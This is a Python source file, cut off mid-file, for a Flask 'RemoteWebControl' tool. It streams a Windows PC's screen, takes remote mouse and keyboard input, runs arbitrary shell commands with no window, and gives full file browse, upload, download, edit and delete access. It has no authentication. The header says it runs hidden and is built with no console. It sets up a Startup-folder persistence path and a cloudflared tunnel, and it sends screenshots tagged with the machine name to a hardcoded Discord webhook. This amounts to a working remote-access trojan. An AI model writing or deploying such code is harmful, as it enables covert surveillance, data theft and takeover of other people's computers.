# RemoteWebControl_ULTRA_PRO.py - PYINSTALLER FIXED VERSION
# Run: pythonw vpsv3_fixed.py (hidden) OR python vpsv3_fixed.py (visible)
# Install: pip install flask flask-socketio pyautogui requests pillow
# Build: pyinstaller --onefile --noconsole vpsv3_fixed.py

import os
import sys
import time
import re
import subprocess
import requests
import threading
import webbrowser
import shutil
from datetime import datetime
from pathlib import Path
from PIL import Image, ImageGrab
from io import BytesIO
import pyautogui
from flask import Flask, Response, render_template_string, request, jsonify, send_file
from flask_socketio import SocketIO

# ========== CONFIG ==========
PORT = 5000
FPS = 30
RESOLUTION = (1280, 720)
JPEG_QUALITY = 60

# FIX CHO PYINSTALLER - Xác định đường dẫn đúng
if getattr(sys, 'frozen', False):
    # Chạy từ PyInstaller exe
    SCRIPT_PATH = Path(sys.executable).resolve()
    BASE_DIR = Path(sys.executable).parent
else:
    # Chạy từ Python script
    SCRIPT_PATH = Path(__file__).resolve()
    BASE_DIR = SCRIPT_PATH.parent

CLOUDFLARED_PATH = BASE_DIR / "cloudflared.exe"
WEBHOOK_URL = "https://discord.com/api/webhooks/1400115709937451169/Smi6NhqHul7R5mlRtuN-ne426kB9ioyF0EkmVPWFCvG1mggloz2Lk6TLU_p5JRfND-CT"
STARTUP_FOLDER = Path.home() / "AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
SHORTCUT_NAME = "RemoteWebControl.bat"
# ============================

app = Flask(__name__)
app.config['SECRET_KEY'] = 'remote_secret'
app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024
socketio = SocketIO(app, cors_allowed_origins="*", ping_timeout=60, ping_interval=25)

# Global vars
tunnel_process = None
server_running = False
tunnel_link = None
capture_lock = threading.Lock()
last_frame = None

pyautogui.FAILSAFE = False

# HTML TEMPLATE
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>VPS Control - ULTRA PRO</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { 
            margin: 0; 
            padding: 0;
            background: #0a0a0a; 
            color: #fff; 
            font-family: 'Segoe UI', Arial;
            height: 100vh;
            overflow: hidden;
        }
        
        .tabs {
            display: flex;
            background: #1a1a1a;
            border-bottom: 2px solid #0f0;
            padding: 0 10px;
        }
        
        .tab {
            padding: 12px 24px;
            cursor: pointer;
            border: none;
            background: transparent;
            color: #888;
            font-size: 14px;
            font-weight: bold;
            transition: all 0.3s;
            border-bottom: 3px solid transparent;
        }
        
        .tab:hover {
            color: #fff;
            background: rgba(255,255,255,0.05);
        }
        
        .tab.active {
            color: #0f0;
            border-bottom-color: #0f0;
        }
        
        .tab-content {
            display: none;
            height: calc(100vh - 50px);
            overflow: hidden;
        }
        
        .tab-content.active {
            display: flex;
        }
        
        /* SCREEN TAB */
        .screen-container {
            display: flex;
            width: 100%;
            height: 100%;
        }
        
        .main-view {
            flex: 3;
            display: flex;
            flex-direction: column;
            padding: 10px;
        }
        
        .side-panel {
            flex: 1;
            background: #1a1a1a;
            padding: 15px;
            overflow-y: auto;
            border-left: 2px solid #333;
            max-width: 350px;
            min-width: 280px;
        }
        
        .stream-wrapper {
            width: 100%;
            height: calc(100% - 40px);
            background: #000;
            border: 2px solid #0f0;
            position: relative;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }
        
        #streamImg {
            max-width: 100%;
            max-height: 100%;
            cursor: crosshair;
            image-rendering: crisp-edges;
        }
        
        #status {
            background: rgba(0,0,0,0.9);
            padding: 8px 15px;
            margin-bottom: 10px;
            border-radius: 5px;
            font-size: 12px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .status-indicator {
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .status-dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        
        .online { color: #0f0; }
        .online .status-dot { background: #0f0; box-shadow: 0 0 10px #0f0; }
        
        h2 {
            font-size: 16px;
            margin: 20px 0 10px 0;
            color: #0ff;
            border-bottom: 1px solid #333;
            padding-bottom: 5px;
        }
        
        h2:first-of-type { margin-top: 0; }
        
        .control-group {
            margin-bottom: 15px;
            background: #2a2a2a;
            padding: 12px;
            border-radius: 5px;
        }
        
        input[type="text"], textarea {
            width: 100%;
            padding: 10px;
            background: #333;
            border: 1px solid #555;
            color: #fff;
            border-radius: 3px;
            font-size: 13px;
            margin-bottom: 8px;
            font-family: 'Consolas', monospace;
        }
        
        textarea {
            resize: vertical;
            min-height: 60px;
        }
        
        button {
            width: 100%;
            padding: 12px;
            background: #0066cc;
            color: #fff;
            border: none;
            border-radius: 3px;
            cursor: pointer;
            font-size: 14px;
            font-weight: bold;
            transition: all 0.2s;
            margin-bottom: 8px;
        }
        
        button:hover { background: #0080ff; }
        button:active { background: #0052a3; }
        button.success { background: #00aa00; }
        button.success:hover { background: #00cc00; }
        button.danger { background: #cc0000; }
        button.danger:hover { background: #ff0000; }
        
        .log {
            background: #000;
            color: #0f0;
            padding: 8px;
            border-radius: 3px;
            font-family: 'Courier New', monospace;
            font-size: 11px;
            max-height: 120px;
            overflow-y: auto;
            margin-top: 8px;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        
        /* CMD TAB */
        .cmd-container {
            display: flex;
            flex-direction: column;
            width: 100%;
            height: 100%;
            padding: 15px;
            gap: 10px;
        }
        
        .cmd-output {
            flex: 1;
            background: #000;
            color: #0f0;
            padding: 15px;
            border-radius: 5px;
            font-family: 'Consolas', monospace;
            font-size: 13px;
            overflow-y: auto;
            white-space: pre-wrap;
            word-wrap: break-word;
            border: 2px solid #0f0;
        }
        
        .cmd-input-area {
            display: flex;
            gap: 10px;
        }
        
        .cmd-input-area input {
            flex: 1;
            margin: 0;
        }
        
        .cmd-input-area button {
            width: auto;
            padding: 12px 30px;
            margin: 0;
        }
        
        /* DISK TAB */
        .disk-container {
            display: flex;
            width: 100%;
            height: 100%;
        }
        
        .disk-tree {
            width: 300px;
            background: #1a1a1a;
            border-right: 2px solid #333;
            overflow-y: auto;
            padding: 10px;
        }
        
        .disk-content {
            flex: 1;
            display: flex;
            flex-direction: column;
            padding: 15px;
        }
        
        .disk-toolbar {
            display: flex;
            gap: 10px;
            margin-bottom: 15px;
            flex-wrap: wrap;
        }
        
        .disk-toolbar button {
            width: auto;
            padding: 10px 20px;
            margin: 0;
        }
        
        .breadcrumb {
            background: #2a2a2a;
            padding: 10px 15px;
            border-radius: 5px;
            margin-bottom: 15px;
            font-size: 13px;
            color: #0ff;
            font-family: 'Consolas', monospace;
        }
        
        .file-list {
            flex: 1;
            background: #1a1a1a;
            border-radius: 5px;
            overflow-y: auto;
            border: 2px solid #333;
        }
        
        .file-item {
            display: flex;
            align-items: center;
            padding: 12px 15px;
            border-bottom: 1px solid #2a2a2a;
            cursor: pointer;
            transition: all 0.2s;
        }
        
        .file-item:hover {
            background: #2a2a2a;
        }
        
        .file-item.selected {
            background: #0066cc;
        }
        
        .file-icon {
            width: 24px;
            height: 24px;
            margin-right: 12px;
            font-size: 20px;
        }
        
        .file-info {
            flex: 1;
        }
        
        .file-name {
            font-size: 14px;
            color: #fff;
            margin-bottom: 3px;
        }
        
        .file-meta {
            font-size: 11px;
            color: #888;
        }
        
        .folder-tree-item {
            padding: 8px 12px;
            cursor: pointer;
            border-radius: 3px;
            margin-bottom: 2px;
            font-size: 13px;
            transition: all 0.2s;
        }
        
        .folder-tree-item:hover {
            background: #2a2a2a;
        }
        
        .folder-tree-item.active {
            background: #0066cc;
            color: #fff;
        }
        
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            z-index: 9999;
            align-items: center;
            justify-content: center;
        }
        
        .modal.active {
            display: flex;
        }
        
        .modal-content {
            background: #1a1a1a;
            padding: 20px;
            border-radius: 8px;
            max-width: 600px;
            width: 90%;
            max-height: 80vh;
            overflow-y: auto;
            border: 2px solid #0f0;
        }
        
        .modal-header {
            font-size: 18px;
            font-weight: bold;
            margin-bottom: 15px;
            color: #0f0;
        }
        
        .modal-body {
            margin-bottom: 15px;
        }
        
        .modal-footer {
            display: flex;
            gap: 10px;
            justify-content: flex-end;
        }
        
        .modal-footer button {
            width: auto;
            padding: 10px 25px;
            margin: 0;
        }
        
        .editor-textarea {
            width: 100%;
            height: 400px;
            font-family: 'Consolas', monospace;
            font-size: 13px;
            background: #000;
            color: #0f0;
            border: 2px solid #333;
            padding: 10px;
            border-radius: 3px;
        }
        
        ::-webkit-scrollbar { width: 8px; }
        ::-webkit-scrollbar-track { background: #1a1a1a; }
        ::-webkit-scrollbar-thumb { background: #555; border-radius: 4px; }
    </style>
</head>
<body>
    <div class="tabs">
        <button class="tab active" onclick="switchTab('screen')">Screen Control</button>
        <button class="tab" onclick="switchTab('cmd')">CMD Terminal</button>
        <button class="tab" onclick="switchTab('disk')">Disk Manager</button>
    </div>
    
    <!-- SCREEN TAB -->
    <div id="screen" class="tab-content active">
        <div class="screen-container">
            <div class="main-view">
                <div id="status">
                    <div class="status-indicator online">
                        <div class="status-dot"></div>
                        <span>Streaming...</span>
                    </div>
                    <div>FPS: <span id="fps">0</span></div>
                </div>
                <div class="stream-wrapper">
                    <img id="streamImg" src="/stream" alt="Screen Stream">
                </div>
            </div>
            
            <div class="side-panel">
                <h2>Browser</h2>
                <div class="control-group">
                    <input type="text" id="urlInput" placeholder="https://example.com" value="https://google.com">
                    <button onclick="openBrowser()">Open Link</button>
                    <div id="browserLog" class="log">Ready...</div>
                </div>
                
                <h2>Screenshot</h2>
                <div class="control-group">
                    <button class="success" onclick="takeScreenshot()">Take & Send</button>
                    <div id="screenshotLog" class="log">Ready...</div>
                </div>
            </div>
        </div>
    </div>
    
    <!-- CMD TAB -->
    <div id="cmd" class="tab-content">
        <div class="cmd-container">
            <div class="cmd-output" id="cmdOutput">Microsoft Windows Command Prompt
Ready for commands...

C:\\Users> _</div>
            <div class="cmd-input-area">
                <input type="text" id="cmdInput" placeholder="Enter command..." onkeypress="if(event.key==='Enter')execCmd()">
                <button onclick="execCmd()">Execute</button>
                <button class="danger" onclick="clearCmd()">Clear</button>
            </div>
        </div>
    </div>
    
    <!-- DISK TAB -->
    <div id="disk" class="tab-content">
        <div class="disk-container">
            <div class="disk-tree" id="diskTree">
                <div style="color: #888; text-align: center; padding: 20px;">Loading drives...</div>
            </div>
            <div class="disk-content">
                <div class="disk-toolbar">
                    <button onclick="refreshDisk()">Refresh</button>
                    <button onclick="goParent()">Parent</button>
                    <button onclick="showNewFolder()">New Folder</button>
                    <button onclick="showUpload()">Upload</button>
                    <button onclick="downloadSelected()">Download</button>
                    <button onclick="editSelected()">Edit</button>
                    <button class="danger" onclick="deleteSelected()">Delete</button>
                </div>
                <div class="breadcrumb" id="breadcrumb">C:\\</div>
                <div class="file-list" id="fileList">
                    <div style="color: #888; text-align: center; padding: 40px;">Select a drive to browse</div>
                </div>
            </div>
        </div>
    </div>
    
    <!-- MODALS -->
    <div id="editModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">Edit File</div>
            <div class="modal-body">
                <textarea id="editContent" class="editor-textarea"></textarea>
            </div>
            <div class="modal-footer">
                <button onclick="saveEdit()">Save</button>
                <button onclick="closeModal('editModal')">Cancel</button>
            </div>
        </div>
    </div>
    
    <div id="newFolderModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">New Folder</div>
            <div class="modal-body">
                <input type="text" id="newFolderName" placeholder="Folder name">
            </div>
            <div class="modal-footer">
                <button onclick="createFolder()">Create</button>
                <button onclick="closeModal('newFolderModal')">Cancel</button>
            </div>
        </div>
    </div>
    
    <script>
        // ===== TAB MANAGEMENT =====
        function switchTab(tabName) {
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
            
            event.target.classList.add('active');
            document.getElementById(tabName).classList.add('active');
            
            if (tabName === 'disk' && !window.diskInitialized) {
                loadDrives();
                window.diskInitialized = true;
            }
        }
        
        // ===== SCREEN CONTROL =====
        const streamImg = document.getElementById('streamImg');
        let frameCount = 0;
        let lastFpsTime = Date.now();
        
        streamImg.onload = function() {
            frameCount++;
            const now = Date.now();
            if (now - lastFpsTime >= 1000) {
                document.getElementById('fps').textContent = frameCount;
                frameCount = 0;
                lastFpsTime = now;
            }
        };
        
        streamImg.onerror = function() {
            setTimeout(() => {
                streamImg.src = '/stream?t=' + Date.now();
            }, 1000);
        };
        
        function getMousePos(e) {
            const rect = streamImg.getBoundingClientRect();
            const scaleX = streamImg.naturalWidth / rect.width;
            const scaleY = streamImg.naturalHeight / rect.height;
            const x = Math.round((e.clientX - rect.left) * scaleX);
            const y = Math.round((e.clientY - rect.top) * scaleY);
            return {x, y};
        }
        
        streamImg.addEventListener('click', async (e) => {
            e.preventDefault();
            const pos = getMousePos(e);
            await fetch('/api/mouse', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({type: 'click', x: pos.x, y: pos.y})
            });
        });
        
        streamImg.addEventListener('contextmenu', async (e) => {
            e.preventDefault();
            const pos = getMousePos(e);
            await fetch('/api/mouse', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({type: 'rightclick', x: pos.x, y: pos.y})
            });
        });
        
        let lastMoveTime = 0;
        streamImg.addEventListener('mousemove', async (e) => {
            const now = Date.now();
            if (now - lastMoveTime < 50) return;
            lastMoveTime = now;
            
            const pos = getMousePos(e);
            await fetch('/api/mouse', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({type: 'move', x: pos.x, y: pos.y})
            }).catch(() => {});
        });
        
        document.addEventListener('keydown', async (e) => {
            if (['F5', 'F12'].includes(e.key)) return;
            if (document.activeElement.tagName === 'INPUT' || document.activeElement.tagName === 'TEXTAREA') return;
            
            e.preventDefault();
            await fetch('/api/key', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({key: e.key})
            }).catch(() => {});
        });
        
        async function openBrowser() {
            const url = document.getElementById('urlInput').value.trim();
            if (!url) {
                document.getElementById('browserLog').textContent = 'ERROR: URL is empty!';
                return;
            }
            document.getElementById('browserLog').textContent = `Opening: ${url}...`;
            try {
                const response = await fetch('/api/browser', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({url})
                });
                const result = await response.json();
                document.getElementById('browserLog').textContent = result.status === 'ok' ? `OK: ${result.msg}` : `ERROR: ${result.msg}`;
            } catch (e) {
                document.getElementById('browserLog').textContent = `ERROR: ${e.message}`;
            }
        }
        
        async function takeScreenshot() {
            document.getElementById('screenshotLog').textContent = 'Taking screenshot...';
            try {
                const response = await fetch('/api/screenshot', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({})
                });
                const result = await response.json();
                document.getElementById('screenshotLog').textContent = result.status === 'ok' ? `OK: ${result.msg}` : `ERROR: ${result.msg}`;
            } catch (e) {
                document.getElementById('screenshotLog').textContent = `ERROR: ${e.message}`;
            }
        }
        
        // ===== CMD TERMINAL =====
        async function execCmd() {
            const input = document.getElementById('cmdInput');
            const output = document.getElementById('cmdOutput');
            const cmd = input.value.trim();
            
            if (!cmd) return;
            
            output.textContent += `\\n\\nC:\\\\> ${cmd}\\n`;
            input.value = '';
            
            try {
                const response = await fetch('/api/cmd', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({command: cmd})
                });
                const result = await response.json();
                
                if (result.status === 'ok') {
                    output.textContent += result.output;
                } else {
                    output.textContent += `ERROR: ${result.msg}`;
                }
            } catch (e) {
                output.textContent += `EXCEPTION: ${e.message}`;
            }
            
            output.scrollTop = output.scrollHeight;
        }
        
        function clearCmd() {
            document.getElementById('cmdOutput').textContent = 'C:\\\\Users> _';
        }
        
        // ===== DISK MANAGER =====
        let currentPath = '';
        let selectedFile = null;
        let currentEditPath = '';
        
        async function loadDrives() {
            try {
                const response = await fetch('/api/disk/drives');
                const result = await response.json();
                
                const tree = document.getElementById('diskTree');
                tree.innerHTML = '<div style="font-weight: bold; color: #0ff; margin-bottom: 10px;">Drives</div>';
                
                result.drives.forEach(drive => {
                    const item = document.createElement('div');
                    item.className = 'folder-tree-item';
                    item.textContent = `${drive}`;
                    item.onclick = () => loadPath(drive);
                    tree.appendChild(item);
                });
            } catch (e) {
                console.error('Load drives error:', e);
            }
        }
        
        async function loadPath(path) {
            currentPath = path;
            selectedFile = null;
            
            document.getElementById('breadcrumb').textContent = path;
            
            try {
                const response = await fetch('/api/disk/list', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({path})
                });
                const result = await response.json();
                
                const list = document.getElementById('fileList');
                list.innerHTML = '';
                
                result.items.forEach(item => {
                    const div = document.createElement('div');
                    div.className = 'file-item';
                    div.onclick = () => selectFile(div, item);
                    div.ondblclick = () => {
                        if (item.type === 'folder') loadPath(item.path);
                    };
                    
                    const icon = item.type === 'folder' ? '[DIR]' : '[FILE]';
                    const size = item.type === 'folder' ? '' : formatSize(item.size);
                    
                    div.innerHTML = `
                        <div class="file-icon">${icon}</div>
                        <div class="file-info">
                            <div class="file-name">${escapeHtml(item.name)}</div>
                            <div class="file-meta">${size} ${item.modified || ''}</div>
                        </div>
                    `;
                    list.appendChild(div);
                });
                
                if (result.items.length === 0) {
                    list.innerHTML = '<div style="color: #888; text-align: center; padding: 40px;">Empty folder</div>';
                }
            } catch (e) {
                console.error('Load path error:', e);
            }
        }
        
        function selectFile(element, item) {
            document.querySelectorAll('.file-item').forEach(el => el.classList.remove('selected'));
            element.classList.add('selected');
            selectedFile = item;
        }
        
        function formatSize(bytes) {
            if (!bytes) return '';
            if (bytes < 1024) return bytes + ' B';
            if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB';
            if (bytes < 1024 * 1024 * 1024) return (bytes / (1024 * 1024)).toFixed(1) + ' MB';
            return (bytes / (1024 * 1024 * 1024)).toFixed(1) + ' GB';
        }
        
        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }
        
        function refreshDisk() {
            if (currentPath) loadPath(currentPath);
        }
        
        function goParent() {
            if (!currentPath) return;
            const parts = currentPath.replace(/\\+$/, '').split('\\');
            if (parts.length <= 1) {
                loadDrives();
                currentPath = '';
                document.getElementById('breadcrumb').textContent = '';
                document.getElementById('fileList').innerHTML = '<div style="color: #888; text-align: center; padding: 40px;">Select a drive</div>';
                return;
            }
            parts.pop();
            const newPath = parts.join('\\') + '\\';
            loadPath(newPath);
        }
        
        function showNewFolder() {
            if (!currentPath) {
                alert('Select a location first');
                return;
            }
            document.getElementById('newFolderName').value = '';
            document.getElementById('newFolderModal').classList.add('active');
        }
        
        async function createFolder() {
            const name = document.getElementById('newFolderName').value.trim();
            if (!name) {
                alert('Enter folder name');
                return;
            }
            
            try {
                const response = await fetch('/api/disk/mkdir', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({path: currentPath, name})
                });
                const result = await response.json();
                
                if (result.status === 'ok') {
                    closeModal('newFolderModal');
                    loadPath(currentPath);
                } else {
                    alert('Error: ' + result.msg);
                }
            } catch (e) {
                alert('Exception: ' + e.message);
            }
        }
        
        function showUpload() {
            if (!currentPath) {
                alert('Select a location first');
                return;
            }
            
            const input = document.createElement('input');
            input.type = 'file';
            input.multiple = true;
            input.onchange = async (e) => {
                const files = e.target.files;
                if (!files.length) return;
                
                for (let file of files) {
                    const formData = new FormData();
                    formData.append('file', file);
                    formData.append('path', currentPath);
                    
                    try {
                        const response = await fetch('/api/disk/upload', {
                            method: 'POST',
                            body: formData
                        });
                        const result = await response.json();
                        
                        if (result.status !== 'ok') {
                            alert(`Upload failed: ${file.name}`);
                        }
                    } catch (e) {
                        alert(`Exception uploading ${file.name}: ${e.message}`);
                    }
                }
                
                loadPath(currentPath);
            };
            input.click();
        }
        
        async function downloadSelected() {
            if (!selectedFile) {
                alert('Select a file first');
                return;
            }
            
            if (selectedFile.type === 'folder') {
                alert('Cannot download folders');
                return;
            }
            
            try {
                window.location.href = `/api/disk/download?path=${encodeURIComponent(selectedFile.path)}`;
            } catch (e) {
                alert('Download error: ' + e.message);
            }
        }
        
        async function editSelected() {
            if (!selectedFile) {
                alert('Select a file first');
                return;
            }
            
            if (selectedFile.type === 'folder') {
                alert('Cannot edit folders');
                return;
            }
            
            if (selectedFile.size > 1024 * 1024) {
                alert('File too large to edit (max 1MB)');
                return;
            }
            
            try {
                const response = await fetch('/api/disk/read', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({path: selectedFile.path})
                });
                const result = await response.json();
                
                if (result.status === 'ok') {
                    currentEditPath = selectedFile.path;
                    document.getElementById('editContent').value = result.content;
                    document.getElementById('editModal').classList.add('active');
                } else {
                    alert('Cannot read file: ' + result.msg);
                }
            } catch (e) {
                alert('Read error: ' + e.message);
            }
        }
        
        async function saveEdit() {
            if (!currentEditPath) return;
            
            const content = document.getElementById('editContent').value;
            
            try {
                const response = await fetch('/api/disk/write', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({path: currentEditPath, content})
                });
                const result = await response.json();
                
                if (result.status === 'ok') {
                    closeModal('editModal');
                    alert('File saved!');
                } else {
                    alert('Save error: ' + result.msg);
                }
            } catch (e) {
                alert('Exception: ' + e.message);
            }
        }
        
        async function deleteSelected() {
            if (!selectedFile) {
                alert('Select a file/folder first');
                return;
            }
            
            if (!confirm(`Delete "${selectedFile.name}"?`)) return;
            
            try {
                const response = await fetch('/api/disk/delete', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({path: selectedFile.path})
                });
                const result = await response.json();
                
                if (result.status === 'ok') {
                    selectedFile = null;
                    loadPath(currentPath);
                } else {
                    alert('Delete error: ' + result.msg);
                }
            } catch (e) {
                alert('Exception: ' + e.message);
            }
        }
        
        function closeModal(id) {
            document.getElementById(id).classList.remove('active');
        }
        
        document.querySelectorAll('.modal').forEach(modal => {
            modal.addEventListener('click', (e) => {
                if (e.target === modal) {
                    modal.classList.remove('active');
                }
            });
        });
        
        console.log('VPS Control ULTRA PRO loaded!');
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

def gen_frames():
    """Generate frames for streaming"""
    global last_frame
    
    while server_running:
        try:
            with capture_lock:
                screenshot = ImageGrab.grab()
                img = screenshot.copy()
                img.thumbnail(RESOLUTION, Image.Resampling.LANCZOS)
            
            img_byte_arr = BytesIO()
            img.save(img_byte_arr, format='JPEG', quality=JPEG_QUALITY, optimize=True)
            frame_data = img_byte_arr.getvalue()
            last_frame = frame_data
            
            yield (b'--frame\r\n'
                   b'Content-Type: image/jpeg\r\n\r\n' + frame_data + b'\r\n')
            
            time.sleep(1.0 / FPS)
            
        except Exception as e:
            if last_frame:
                yield (b'--frame\r\n'
                       b'Content-Type: image/jpeg\r\n\r\n' + last_frame + b'\r\n')
            time.sleep(0.5)

@app.route('/stream')
def stream():
    return Response(gen_frames(), 
                    mimetype='multipart/x-mixed-replace; boundary=frame',
                    headers={'Cache-Control': 'no-cache, no-store, must-revalidate'})

@app.route('/api/mouse', methods=['POST'])
def api_mouse():
    try:
        data = request.json
        x = int(float(data['x']))
        y = int(float(data['y']))
        action = data.get('type', 'move')
        
        if action == 'click':
            pyautogui.click(x, y)
        elif action == 'move':
            pyautogui.moveTo(x, y, duration=0)
        elif action == 'rightclick':
            pyautogui.rightClick(x, y)
            
        return jsonify({'status': 'ok'})
    except Exception as e:
        return jsonify({'status': 'error', 'msg': str(e)}), 400

@app.route('/api/key', methods=['POST'])
def api_key():
    try:
        data = request.json
        key = data['key']
        
        key_map = {
            'ArrowUp': 'up', 'ArrowDown': 'down',
            'ArrowLeft': 'left', 'ArrowRight': 'right',
            'Enter': 'enter', 'Backspace': 'backspace',
            'Escape': 'esc', 'Tab': 'tab',
            'Delete': 'delete', ' ': 'space'
        }
        
        mapped_key = key_map.get(key, key.lower())
        pyautogui.press(mapped_key)
        return jsonify({'status': 'ok'})
        
    except Exception as e:
        return jsonify({'status': 'error', 'msg': str(e)}), 400

@app.route('/api/browser', methods=['POST'])
def api_browser():
    try:
        data = request.json
        url = data.get('url', '').strip()
        
        if not url:
            return jsonify({'status': 'error', 'msg': 'URL is empty'}), 400
        
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        
        webbrowser.open(url)
        return jsonify({'status': 'ok', 'msg': f'Opened: {url}'})
        
    except Exception as e:
        return jsonify({'status': 'error', 'msg': str(e)}), 500

@app.route('/api/screenshot', methods=['POST'])
def api_screenshot():
    try:
        screenshot = ImageGrab.grab()
        max_size = (1920, 1080)
        screenshot.thumbnail(max_size, Image.Resampling.LANCZOS)
        
        img_byte_arr = BytesIO()
        screenshot.save(img_byte_arr, format='PNG', optimize=True)
        img_bytes = img_byte_arr.getvalue()
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        machine = os.environ.get('COMPUTERNAME', 'Unknown')
        
        files = {'file': ('screenshot.png', img_bytes, 'image/png')}
        payload = {'content': f"Screenshot from **{machine}** at {timestamp}"}
        
        response = requests.post(WEBHOOK_URL, data=payload, files=files, timeout=30)
        
        if response.status_code in [200, 204]:
            return jsonify({'status': 'ok', 'msg': f'Screenshot sent! ({len(img_bytes)//1024}KB)'})
        else:
            return jsonify({'status': 'error', 'msg': f'Discord error: {response.status_code}'}), 500
            
    except Exception as e:
        return jsonify({'status': 'error', 'msg': str(e)}), 500

@app.route('/api/cmd', methods=['POST'])
def api_cmd():
    try:
        data = request.json
        command = data.get('command', '').strip()
        
        if not command:
            return jsonify({'status': 'error', 'msg': 'Command is empty'}), 400
        
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30,
            creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == 'win32' else 0
        )
        
        output = result.stdout
        if result.stderr:
            output += "\n[STDERR]\n" + result.stderr
        
        if not output:
            output = "[Command executed, no output]"
        
        return jsonify({'status': 'ok', 'output': output})
        
    except subprocess.TimeoutExpired:
        return jsonify({'status': 'error', 'msg': 'Command timeout (30s)'}), 400
    except Exception as e:
        return jsonify({'status': 'error', 'msg': str(e)}), 500

@app.route('/api/disk/drives', methods=['GET'])
def api_disk_drives():
    try:
        import string
        drives = []
        
        for letter in string.ascii_uppercase:
            drive = f"{letter}:\\"
            if os.path.exists(drive):
                drives.append(drive)
        
        return jsonify({'status': 'ok', 'drives': drives})
        
    except Exception as e:
        return jsonify({'status': 'error', 'msg': str(e)}), 500

@app.route('/api/disk/list', methods=['POST'])
def api_disk_list():
    try:
        data = request.json
        path = data.get('path', '')
        
        if not path or not os.path.exists(path):
            return jsonify({'status': 'error', 'msg': 'Invalid path'}), 400
        
        items = []
        
        try:
            entries = list(os.scandir(path))
        except PermissionError:
            return jsonify({'status': 'error', 'msg': 'Permission denied'}), 403
        
        for entry in entries:
            try:
                stat = entry.stat()
                item = {
                    'name': entry.name,
                    'path': entry.path,
                    'type': 'folder' if entry.is_dir() else 'file',
                    'size': stat.st_size if entry.is_file() else 0,
                    'modified': datetime.fromtimestamp(stat.st_mtime).strftime('%Y-%m-%d %H:%M')
                }
                items.append(item)
            except:
                continue
        
        items.sort(key=lambda x: (x['type'] != 'folder', x['name'].lower()))
        
        return jsonify({'status': 'ok', 'items': items})
        
    except Exception as e:
        return jsonify({'status': 'error', 'msg': str(e)}), 500

@app.route('/api/disk/mkdir', methods=['POST'])
def api_disk_mkdir():
    try:
        data = request.json
        path = data.get('path', '')
        name = data.get('name', '').strip()
        
        if not path or not name:
            return jsonify({'status': 'error', 'msg': 'Invalid input'}), 400
        
        new_path = os.path.join(path, name)
        
        if os.path.exists(new_path):
            return jsonify({'status': 'error', 'msg': 'Already exists'}), 400
        
        os.makedirs(new_path)
        return jsonify({'status': 'ok', 'msg': 'Folder created'})
        
    except Exception as e:
        return jsonify({'status': 'error', 'msg': str(e)}), 500

@app.route('/api/disk/upload', methods=['POST'])
def api_disk_upload():
    try:
        if 'file' not in request.files:
            return jsonify({'status': 'error', 'msg': 'No file'}), 400
        
        file = request.files['file']
        path = request.form.get('path', '')
        
        if not path or not file.filename:
            return jsonify({'status': 'error', 'msg': 'Invalid input'}), 400
        
        save_path = os.path.join(path, file.filename)
        file.save(save_path)
        
        return jsonify({'status': 'ok', 'msg': 'File uploaded'})
        
    except Exception as e:
        return jsonify({'status': 'error', 'msg': str(e)}), 500

@app.route('/api/disk/download', methods=['GET'])
def api_disk_download():
    try:
        path = request.args.get('path', '')
        
        if not path or not os.path.isfile(path):
            return jsonify({'status': 'error', 'msg': 'Invalid file'}), 400
        
        return send_file(path, as_attachment=True)
        
    except Exception as e:
        return jsonify({'status': 'error', 'msg': str(e)}), 500

@app.route('/api/disk/read', methods=['POST'])
def api_disk_read():
    try:
        data = request.json
        path = data.get('path', '')
        
        if not path or not os.path.isfile(path):
            return jsonify({'status': 'error', 'msg': 'Invalid file'}), 400
        
        content = None
        for encoding in ['utf-8', 'latin-1', 'cp1252']:
            try:
                with open(path, 'r', encoding=encoding) as f:
                    content = f.read()
                break
            except:
                continue
        
        if content is None:
            return jsonify({'status': 'error', 'msg': 'Cannot read file (binary?)'}), 400
        
        return jsonify({'status': 'ok', 'content': content})
        
    except Exception as e:
        return jsonify({'status': 'error', 'msg': str(e)}), 500

@app.route('/api/disk/write', methods=['POST'])
